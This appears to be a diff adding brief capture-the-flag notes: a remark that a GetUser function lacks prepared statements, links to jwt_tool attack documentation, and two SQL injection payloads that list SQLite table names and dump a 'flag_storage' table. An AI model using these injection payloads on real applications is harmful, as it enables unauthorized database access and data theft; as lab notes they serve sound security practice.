@@ -1,0 +1,5 @@
+GetUser doesn't have prepared statements
+https://github.com/ticarpi/jwt_tool/wiki/Known-Exploits-and-Attacks
+https://github.com/ticarpi/jwt_tool/wiki/Using-jwt_tool
+SELECT 1,tbl_name,3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
+UNION SELECT * FROM flag_storage --
